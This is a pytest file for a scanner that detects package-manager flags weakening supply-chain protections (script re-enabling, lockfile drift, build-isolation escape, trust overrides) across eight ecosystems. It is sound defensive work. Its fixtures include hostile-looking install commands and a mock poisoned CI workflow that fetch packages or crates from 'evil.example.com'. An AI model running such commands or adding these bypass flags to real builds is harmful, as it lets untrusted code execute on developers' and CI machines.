"""Tests for scripts/lib/pkg_bypass_patterns.py.

Pattern-coverage tests for the 8 package-manager bypass rules:
  1. PKG-BYPASS-NPM-SCRIPTS-FLAG               (npm/yarn/bun)
  2. PKG-BYPASS-PNPM-HOIST-OR-LOCKFILE          (pnpm)
  3. PKG-BYPASS-YARN-SCRIPTS-OR-CHECKSUMS       (yarn)
  4. PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM (pip / uv)
  5. PKG-BYPASS-CARGO-GIT-NO-DEFAULTS           (cargo)
  6. PKG-BYPASS-COMPOSER-PLUGINS-OR-SCRIPTS     (composer)
  7. PKG-BYPASS-GEM-PRE-OR-IGNORE-DEPS          (gem)
  8. PKG-BYPASS-BUN-NO-CACHE-OR-VERIFY          (bun)

Every rule gets at least one positive test (flag appears, must fire) and
1-2 negative tests (flag absent, OR benign context like prose-only
mention that lacks the command anchor).
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import pkg_bypass_patterns as pbp  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_frozen() -> None:
    """RULES must be a tuple (immutable) — same-shape contract as
    agent_config_patterns.RULES."""
    assert isinstance(pbp.RULES, tuple)
    assert len(pbp.RULES) >= 6  # 8 implemented; allow >=6 per task spec


def test_every_advertised_rule_id_present() -> None:
    """All 8 advertised rule_ids from distill2-h must exist in RULES."""
    rule_ids = {r.id for r in pbp.RULES}
    expected = {
        "PKG-BYPASS-NPM-SCRIPTS-FLAG",
        "PKG-BYPASS-PNPM-HOIST-OR-LOCKFILE",
        "PKG-BYPASS-YARN-SCRIPTS-OR-CHECKSUMS",
        "PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM",
        "PKG-BYPASS-CARGO-GIT-NO-DEFAULTS",
        "PKG-BYPASS-COMPOSER-PLUGINS-OR-SCRIPTS",
        "PKG-BYPASS-GEM-PRE-OR-IGNORE-DEPS",
        "PKG-BYPASS-BUN-NO-CACHE-OR-VERIFY",
    }
    assert expected.issubset(rule_ids)


def test_every_rule_has_owasp_and_ecosystem() -> None:
    for rule in pbp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id
        assert rule.ecosystem, rule.id


def test_finding_shape() -> None:
    f = pbp.Finding(
        rule_id="PKG-BYPASS-NPM-SCRIPTS-FLAG", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-05", ecosystem="npm",
    )
    assert f.rule_id == "PKG-BYPASS-NPM-SCRIPTS-FLAG"
    assert f.ecosystem == "npm"


def _hits(rule_id: str, text: str) -> list[pbp.Finding]:
    """Return only findings of `rule_id` from scan_text(text)."""
    return [f for f in pbp.scan_text(text) if f.rule_id == rule_id]


# ---------- Rule 1: PKG-BYPASS-NPM-SCRIPTS-FLAG --------------------------


def test_npm_ignore_scripts_false_positive() -> None:
    """Workflow step that re-enables postinstall must fire."""
    assert _hits(
        "PKG-BYPASS-NPM-SCRIPTS-FLAG",
        "- run: npm install --ignore-scripts=false",
    )


def test_npm_ignore_scripts_yarn_form_positive() -> None:
    """yarn add with the bypass flag must fire (same rule covers yarn/bun)."""
    assert _hits(
        "PKG-BYPASS-NPM-SCRIPTS-FLAG",
        "yarn add lodash --ignore-scripts=false",
    )


def test_npm_ignore_scripts_negative_prose() -> None:
    """README prose that DESCRIBES the flag without the install-cmd anchor
    must NOT fire — only the command-surface form is dangerous."""
    assert not _hits(
        "PKG-BYPASS-NPM-SCRIPTS-FLAG",
        "The --ignore-scripts=false flag re-enables postinstall RCE. Avoid it.",
    )


def test_npm_safe_install_negative() -> None:
    """`npm install` without the bypass flag must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-NPM-SCRIPTS-FLAG",
        "- run: npm install --ignore-scripts",
    )


# ---------- Rule 2: PKG-BYPASS-PNPM-HOIST-OR-LOCKFILE --------------------


def test_pnpm_shamefully_hoist_positive() -> None:
    """The pnpm --shamefully-hoist flag must fire (silently flattens
    transitives, bypasses strict isolation)."""
    assert _hits(
        "PKG-BYPASS-PNPM-HOIST-OR-LOCKFILE",
        "RUN pnpm install --shamefully-hoist",
    )


def test_pnpm_no_min_release_age_positive() -> None:
    """The most dangerous pnpm flag — direct counter of 5-day quarantine."""
    assert _hits(
        "PKG-BYPASS-PNPM-HOIST-OR-LOCKFILE",
        "pnpm install --no-min-release-age",
    )


def test_pnpm_no_frozen_lockfile_positive() -> None:
    """--no-frozen-lockfile permits lockfile drift."""
    assert _hits(
        "PKG-BYPASS-PNPM-HOIST-OR-LOCKFILE",
        "  - run: pnpm install --no-frozen-lockfile",
    )


def test_pnpm_safe_install_negative() -> None:
    """Plain `pnpm install` must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-PNPM-HOIST-OR-LOCKFILE",
        "pnpm install --frozen-lockfile",
    )


def test_pnpm_prose_negative() -> None:
    """README mentioning `--shamefully-hoist` in prose only must NOT fire
    — no `pnpm install/add/update` anchor on the line."""
    assert not _hits(
        "PKG-BYPASS-PNPM-HOIST-OR-LOCKFILE",
        "The --shamefully-hoist flag is dangerous; never use it in CI.",
    )


# ---------- Rule 3: PKG-BYPASS-YARN-SCRIPTS-OR-CHECKSUMS -----------------


def test_yarn_enable_scripts_positive() -> None:
    """yarn config set enableScripts true must fire."""
    assert _hits(
        "PKG-BYPASS-YARN-SCRIPTS-OR-CHECKSUMS",
        "yarn config set enableScripts true",
    )


def test_yarn_update_checksums_positive() -> None:
    """--update-checksums overwrites lockfile integrity → must fire."""
    assert _hits(
        "PKG-BYPASS-YARN-SCRIPTS-OR-CHECKSUMS",
        "yarn install --update-checksums",
    )


def test_yarn_check_files_false_positive() -> None:
    """--check-files=false silences yarn PnP integrity verifier."""
    assert _hits(
        "PKG-BYPASS-YARN-SCRIPTS-OR-CHECKSUMS",
        "yarn install --check-files=false",
    )


def test_yarn_bare_ignore_scripts_negative() -> None:
    """`yarn install --ignore-scripts` (bare form) is the SAFE form in yarn
    Berry — means "skip scripts during install". Must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-YARN-SCRIPTS-OR-CHECKSUMS",
        "yarn install --ignore-scripts",
    )


def test_yarn_safe_install_negative() -> None:
    """Plain `yarn install` must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-YARN-SCRIPTS-OR-CHECKSUMS",
        "yarn install --frozen-lockfile",
    )


# ---------- Rule 4: PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM ----------


def test_pip_break_system_packages_positive() -> None:
    """--break-system-packages must fire (PEP 668 emergency override)."""
    assert _hits(
        "PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM",
        "pip install --break-system-packages requests",
    )


def test_pip_no_build_isolation_positive() -> None:
    """--no-build-isolation escapes the PEP 517 build sandbox."""
    assert _hits(
        "PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM",
        "pip install --no-build-isolation numpy",
    )


def test_uv_pip_no_build_isolation_positive() -> None:
    """uv pip install must also be caught by the same rule."""
    assert _hits(
        "PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM",
        "uv pip install --no-build-isolation torch",
    )


def test_pip_trusted_host_external_positive() -> None:
    """--trusted-host pointing at a non-loopback host disables TLS verify."""
    assert _hits(
        "PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM",
        "pip install --trusted-host evil.example.com badpkg",
    )


def test_pip_trusted_host_loopback_negative() -> None:
    """--trusted-host localhost / 127.0.0.1 is a legitimate proxy setup —
    must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM",
        "pip install --trusted-host localhost mypkg",
    )
    assert not _hits(
        "PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM",
        "pip install --trusted-host 127.0.0.1 mypkg",
    )


def test_pip_no_cache_negative() -> None:
    """--no-cache is legitimate CI use (avoids cache poisoning). NOT a
    bypass; must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM",
        "pip install --no-cache mypkg",
    )


def test_pip_safe_install_negative() -> None:
    """Plain `pip install` must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM",
        "pip install requests",
    )


# ---------- Rule 5: PKG-BYPASS-CARGO-GIT-NO-DEFAULTS ---------------------


def test_cargo_git_no_default_features_positive() -> None:
    """The COMBINATION cargo install --git URL --no-default-features
    must fire — bypasses crates.io review AND skips opt-in safety
    features."""
    assert _hits(
        "PKG-BYPASS-CARGO-GIT-NO-DEFAULTS",
        "cargo install --git https://evil.example.com/crate --no-default-features",
    )


def test_cargo_no_verify_positive() -> None:
    """cargo install --no-verify alone is also a weakening."""
    assert _hits(
        "PKG-BYPASS-CARGO-GIT-NO-DEFAULTS",
        "cargo install mycrate --no-verify",
    )


def test_cargo_git_alone_negative() -> None:
    """cargo install --git URL alone (without --no-default-features) is
    common in workspace setups — must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-CARGO-GIT-NO-DEFAULTS",
        "cargo install --git https://github.com/myorg/mycrate",
    )


def test_cargo_no_default_features_alone_negative() -> None:
    """cargo install --no-default-features alone is common in lean builds
    — must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-CARGO-GIT-NO-DEFAULTS",
        "cargo install mycrate --no-default-features",
    )


# ---------- Rule 6: PKG-BYPASS-COMPOSER-PLUGINS-OR-SCRIPTS ---------------


def test_composer_no_scripts_false_positive() -> None:
    """composer install --no-scripts=false re-enables script execution."""
    assert _hits(
        "PKG-BYPASS-COMPOSER-PLUGINS-OR-SCRIPTS",
        "composer install --no-scripts=false",
    )


def test_composer_allow_plugins_wildcard_positive() -> None:
    """composer.json with allow-plugins wildcard must fire."""
    assert _hits(
        "PKG-BYPASS-COMPOSER-PLUGINS-OR-SCRIPTS",
        '{ "config": { "allow-plugins": { "*": true } } }',
    )


def test_composer_allow_plugins_specific_negative() -> None:
    """Per-plugin FQN allow is the SAFE form — must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-COMPOSER-PLUGINS-OR-SCRIPTS",
        '{ "config": { "allow-plugins": { "phpstan/extension-installer": true } } }',
    )


def test_composer_safe_install_negative() -> None:
    """Plain `composer install` must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-COMPOSER-PLUGINS-OR-SCRIPTS",
        "composer install --no-dev",
    )


# ---------- Rule 7: PKG-BYPASS-GEM-PRE-OR-IGNORE-DEPS --------------------


def test_gem_pre_positive() -> None:
    """gem install --pre opts into preview versions (bypasses release
    review window)."""
    assert _hits(
        "PKG-BYPASS-GEM-PRE-OR-IGNORE-DEPS",
        "gem install rest-client --pre",
    )


def test_gem_ignore_dependencies_positive() -> None:
    """--ignore-dependencies evades transitive scanners."""
    assert _hits(
        "PKG-BYPASS-GEM-PRE-OR-IGNORE-DEPS",
        "gem install foo --ignore-dependencies",
    )


def test_gem_force_positive() -> None:
    """--force skips signature verification."""
    assert _hits(
        "PKG-BYPASS-GEM-PRE-OR-IGNORE-DEPS",
        "gem install foo --force",
    )


def test_gem_safe_install_negative() -> None:
    """Plain `gem install` must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-GEM-PRE-OR-IGNORE-DEPS",
        "gem install rails",
    )


def test_gem_prose_negative() -> None:
    """README prose mentioning --pre without the install-cmd anchor
    must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-GEM-PRE-OR-IGNORE-DEPS",
        "The --pre flag opts into preview gem versions; avoid in CI.",
    )


# ---------- Rule 8: PKG-BYPASS-BUN-NO-CACHE-OR-VERIFY --------------------


def test_bun_trust_positive() -> None:
    """bun install --trust pkgname bypasses trustedDependencies allowlist."""
    assert _hits(
        "PKG-BYPASS-BUN-NO-CACHE-OR-VERIFY",
        "bun install --trust evil-pkg",
    )


def test_bun_no_cache_positive() -> None:
    """bun install --no-cache weakens cache-verified state."""
    assert _hits(
        "PKG-BYPASS-BUN-NO-CACHE-OR-VERIFY",
        "bun install --no-cache",
    )


def test_bun_no_verify_positive() -> None:
    """bun install --no-verify is the bun last-resort option."""
    assert _hits(
        "PKG-BYPASS-BUN-NO-CACHE-OR-VERIFY",
        "bun install --no-verify",
    )


def test_bun_safe_install_negative() -> None:
    """Plain `bun install` must NOT fire."""
    assert not _hits(
        "PKG-BYPASS-BUN-NO-CACHE-OR-VERIFY",
        "bun install --frozen-lockfile",
    )


def test_bun_prose_negative() -> None:
    """Prose only mention of --trust must NOT fire (no bun-install anchor)."""
    assert not _hits(
        "PKG-BYPASS-BUN-NO-CACHE-OR-VERIFY",
        "The bun --trust flag overrides the trustedDependencies allowlist.",
    )


# ---------- Cross-cutting: workflow file with multiple violations -------


def test_full_workflow_file_multiple_hits() -> None:
    """A realistic poisoned CI workflow must produce findings for every
    distinct bypass."""
    text = """\
name: ci

on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm install --ignore-scripts=false
      - run: pnpm install --no-min-release-age
      - run: pip install --break-system-packages requests
      - run: cargo install --git https://evil.example.com/c --no-default-features
"""
    findings = pbp.scan_text(text)
    rule_ids = {f.rule_id for f in findings}
    assert "PKG-BYPASS-NPM-SCRIPTS-FLAG" in rule_ids
    assert "PKG-BYPASS-PNPM-HOIST-OR-LOCKFILE" in rule_ids
    assert "PKG-BYPASS-PIP-UV-ISOLATION-OR-BREAK-SYSTEM" in rule_ids
    assert "PKG-BYPASS-CARGO-GIT-NO-DEFAULTS" in rule_ids


def test_empty_input_negative() -> None:
    """Empty / whitespace-only input must produce zero findings."""
    assert pbp.scan_text("") == []
    assert pbp.scan_text("   \n   \n") == []


def test_line_column_reporting() -> None:
    """Findings must carry the (line, column) of the match start."""
    text = "echo hello\necho world\nnpm install --ignore-scripts=false\n"
    hits = _hits("PKG-BYPASS-NPM-SCRIPTS-FLAG", text)
    assert len(hits) == 1
    assert hits[0].line == 3
    assert hits[0].column >= 1


def test_dedup_same_rule_same_position() -> None:
    """Two patterns matching at the exact same (line, col) for the SAME
    rule emit ONE finding — dedup invariant."""
    text = "npm install --ignore-scripts=false"
    hits = _hits("PKG-BYPASS-NPM-SCRIPTS-FLAG", text)
    assert len(hits) == 1


def test_matched_text_truncation() -> None:
    """Matched text > 200 chars must be truncated with the trailing ellipsis."""
    # Construct a synthetic install line that triggers a rule but has
    # a very long tail (simulated by a long package list).
    long_tail = " ".join(f"pkg{i}" for i in range(80))
    text = f"npm install --ignore-scripts=false {long_tail}"
    hits = _hits("PKG-BYPASS-NPM-SCRIPTS-FLAG", text)
    assert hits
    # Rule pattern stops at the flag itself, so matched_text will be short.
    # This test just verifies the truncation path doesn't crash on long inputs.
    for h in hits:
        assert len(h.matched_text) <= 201  # 200 + the "…"
